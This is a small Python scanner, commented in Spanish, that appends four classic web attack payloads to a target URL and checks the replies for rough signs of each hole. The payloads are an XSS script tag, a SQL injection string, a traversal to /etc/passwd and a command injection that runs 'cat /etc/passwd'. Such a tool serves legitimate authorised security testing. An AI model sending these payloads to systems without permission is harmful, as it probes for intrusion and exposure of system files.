import requests

def scan_for_common_vulnerabilities(url):
    print(f"\n[+] Escaneando vulnerabilidades comunes en: {url}\n")

    payloads = {
        "XSS": "<script>alert(1)</script>",
        "SQLi": "' OR '1'='1",
        "LFI": "../../etc/passwd",
        "RCE": "; cat /etc/passwd"
    }

    for vuln_type, payload in payloads.items():
        test_url = f"{url}?vuln={payload}"
        print(f"   [*] Probando {vuln_type} con: {test_url}")

        try:
            response = requests.get(test_url, timeout=10)

            if vuln_type == "XSS" and payload in response.text:
                print("     ✔ Posible XSS detectado (reflejo del script)")
            elif vuln_type == "SQLi" and "sql" in response.text.lower():
                print("     ✔ Posible Inyección SQL detectada")
            elif vuln_type == "LFI" and "root:x" in response.text:
                print("     ✔ Posible LFI detectado (/etc/passwd accesible)")
            elif vuln_type == "RCE" and "root:" in response.text:
                print("     ✔ Posible RCE detectado")
            else:
                print("     ✘ No se detectó vulnerabilidad visible")
        except Exception as e:
            print(f"     [!] Error durante la prueba: {e}")
